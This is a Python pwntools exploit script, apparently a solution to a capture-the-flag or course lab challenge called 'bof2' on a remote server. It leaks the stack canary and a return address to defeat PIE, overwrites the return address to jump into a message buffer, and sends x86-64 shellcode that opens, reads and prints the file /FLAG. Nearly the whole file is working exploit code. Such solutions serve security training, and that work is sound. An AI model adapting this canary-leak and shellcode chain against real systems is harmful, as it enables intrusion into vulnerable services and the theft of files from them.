from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# context.log_level = 'debug'

ELF_PATH = "./bof2"
USE_REMOTE = True
HOST = "up.zoolab.org"
PORT = 12343

OFFSET_CANARY = 0x89  # 0x90 - canary(8) + 1(0x00)
OFFSET_RETADDR = 96 + 8  # buf1(48) + buf2(48) + canary(8)

io = remote(HOST, PORT)

# ================================
# Step 1: Leak Canary
# ================================
def leak_canary():
    io.recvuntil(b"What's your name? ")
    io.send(b"A" * OFFSET_CANARY)
    io.recvuntil(b"Welcome, ")
    leak = io.recvline().strip()
    canary = b"\x00" + leak[137:144]
    canary = canary.ljust(8, b'\x00')
    canary = u64(canary)
    log.success(f"Leaked canary: 0x{canary:016x}")

    # for i in range(135, 150):
    #     print(f"{i=}, byte=0x{leak[i:i+1].hex()}")

    return canary

# ================================
# Run All
# ================================
def main():
    canary = leak_canary()

    # ================================
    # Step 2: Leak Return Address
    # ================================
    io.recvuntil(b"What's the room number? ")
    payload = b"B" * OFFSET_RETADDR
    io.send(payload)
    io.recvuntil(b"The room number is: ")
    leak2 = io.recvline().strip()

    ret_leak = u64(leak2[-6:].ljust(8, b"\x00"))
    log.success(f"Leaked return address: {hex(ret_leak)}")

    pie_base = ret_leak - 0x9cbc # main func return addr # calculate main entry
    msg_addr = pie_base + 0xef220  # ef220 is relative offset from main entry
    log.info(f"PIE base = {hex(pie_base)}")
    log.success(f"msg address = {hex(msg_addr)}")

    # ================================
    # Step 3: Exploit
    # ================================
    io.recvuntil(b"What's the customer's name? ")

    # buf3 (40) + canary (8) + rbp (8) + ret (8)
    payload = b"C" * 40 
    payload += p64(canary)
    payload += b"D" * 8
    payload += p64(msg_addr)  # redirect to msg

    io.send(payload)
    # shellcode to read /FLAG and print it
    shellcode = asm('''
        xor rax, rax
        push rax
        mov rbx, 0x47414c462f
        push rbx
        mov rdi, rsp
        xor rsi, rsi
        mov eax, SYS_open
        syscall

        mov rdi, rax
        mov rsi, rsp
        mov edx, 100
        xor eax, eax
        syscall

        mov rdx, rax
        mov rdi, 1
        mov eax, SYS_write
        syscall

        mov eax, SYS_exit
        xor edi, edi
        syscall
    ''')

    # io.send(shellcode)
    io.sendafter(b"Leave your message: ", shellcode)
    # io.interactive()
    flag_content = io.recvall(timeout=1)
    print(flag_content.decode(errors='ignore').strip())

if __name__ == "__main__":
    main()
